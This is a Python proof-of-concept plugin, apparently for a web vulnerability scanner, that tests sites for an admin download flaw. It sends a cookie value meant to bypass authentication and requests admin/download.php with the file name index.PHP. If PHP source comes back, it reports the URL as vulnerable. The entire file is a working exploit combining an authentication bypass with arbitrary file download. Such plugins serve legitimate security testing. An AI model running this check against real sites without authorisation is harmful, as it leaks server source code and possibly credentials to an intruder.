#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @author: orleven

from lib.util.aiohttputil import ClientSession
from lib.core.enums import ServicePortMap
from script import BaseScript

class Script(BaseScript):

    """
    https://xz.aliyun.com/t/3614
    """
    def __init__(self):
        BaseScript.__init__(self)
        self.service_type = ServicePortMap.WEB

    async def prove(self):
        if self.base_url:
            async with ClientSession() as session:
                headers = {
                    "User-Agent": "Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/534.4 (KHTML, like Gecko) Chrome/6.0.481.0 Safari/534.4",
                    "Cookie": "user=%;pass=%;"
                }
                for path in self.get_url_normpath_list(self.url):
                    poc = "index.php"
                    url = path +"admin/download.php?DownName=%s" % poc.replace("h","H")
                    async with session.get(url=url, headers = headers) as res:
                        if res != None:
                            text = await res.text()
                            if '<?php' in text:
                                yield url